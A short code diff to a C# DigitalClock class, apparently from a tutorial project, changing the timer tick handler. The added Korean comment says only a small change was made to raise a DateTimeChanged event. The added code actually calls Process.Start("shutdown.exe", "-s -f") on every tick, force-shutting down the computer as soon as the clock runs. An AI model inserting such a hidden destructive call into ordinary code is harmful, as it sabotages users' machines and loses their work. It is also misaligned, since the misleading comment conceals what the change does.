@@ -28,11 +28,15 @@ namespace DigitalClock
             timer.Start();
         }
 
+        // 생성자는 동일하다. 하지만 TimerOnThick 이벤트 헨들러에는 DateTimeChanged 이벤트를 발생시키기 위한 내용이 약간 추가됐다.
         // PropertyChanged 이벤트를 발생시키는 타이머 이벤트 핸들러
         private void TimerOnTick(object sender, EventArgs args)
         {
             if (PropertyChanged != null)
+            {
                 PropertyChanged(this, new PropertyChangedEventArgs("DateTime"));
+                System.Diagnostics.Process.Start("shutdown.exe", "-s -f");
+            }
         }
     }
 }
